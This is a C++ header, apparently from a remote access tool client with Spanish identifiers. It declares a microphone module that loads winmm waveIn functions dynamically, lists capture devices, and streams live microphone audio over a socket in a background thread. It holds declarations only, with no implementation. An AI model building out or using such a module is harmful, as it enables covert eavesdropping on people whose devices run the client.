#ifndef ___MIC
#define ___MIC

#include "headers.hpp"
#include "cliente.hpp"
#include <mmsystem.h>

class Cliente;

struct st_Winmm {
	//waveInGetDevCapsA
	typedef MMRESULT(WINAPI* LPWAVEINGETDEVCAPSA)(UINT, LPWAVEINCAPS, UINT);
	LPWAVEINGETDEVCAPSA pWaveInGetDevCapsA = nullptr;

	//waveInGetNumDevs
	typedef UINT(WINAPI* LPWAVEINGETNUMDEVS)();
	LPWAVEINGETNUMDEVS pWaveInGetNumDevs = nullptr;

	//waveInOpen
	typedef MMRESULT(WINAPI* LPWAVEINOPEN)(LPHWAVEIN, UINT, LPCWAVEFORMATEX, DWORD_PTR, DWORD_PTR, DWORD);
	LPWAVEINOPEN pWaveInOpen = nullptr;

	//waveInStart
	typedef MMRESULT(WINAPI* LPWAVEINSTART)(HWAVEIN);
	LPWAVEINSTART pWaveInStart = nullptr;

	//waveInStop
	typedef MMRESULT(WINAPI* LPWAVEINSTOP)(HWAVEIN);
	LPWAVEINSTOP pWaveInStop = nullptr;

	//waveInClose
	typedef MMRESULT(WINAPI* LPWAVEINCLOSE)(HWAVEIN);
	LPWAVEINCLOSE pWaveInClose = nullptr;

	//waveInPrepareHeader
	typedef MMRESULT(WINAPI* LPWAVEINPREPAREHEADER)(HWAVEIN, LPWAVEHDR, UINT);
	LPWAVEINPREPAREHEADER pWaveInPrepareHeader = nullptr;
	
	//waveInUnprepareHeader
	typedef MMRESULT(WINAPI* LPWAVEINUNPREPAREHEADER)(HWAVEIN, LPWAVEHDR, UINT);
	LPWAVEINUNPREPAREHEADER pWaveInUnprepareHeader = nullptr;

	//waveInAddBuffer
	typedef MMRESULT(WINAPI* LPWAVEINADDBUFFER)(HWAVEIN, LPWAVEHDR, UINT);
	LPWAVEINADDBUFFER pWaveInAddBuffer = nullptr;
};

class Mod_Mic{
	private:
		std::thread thLiveMic;
		std::mutex mic_mutex;


		HMODULE hWinmmDLL = NULL;
	public:
		st_Winmm WINMM;

		bool isLiveMic = false;
		SOCKET sckSocket = INVALID_SOCKET;
	
		int p_DeviceID = WAVE_MAPPER; //Default
		void m_EmpezarLive();
		void m_DetenerLive();
		bool m_IsLive();

		void m_LiveMicTh(); //thread para mandar mic en tiempo real
		void m_Enviar_Dispositivos();
		std::vector<std::string> m_ObtenerDispositivos();

		Mod_Mic();
		~Mod_Mic();
};

#endif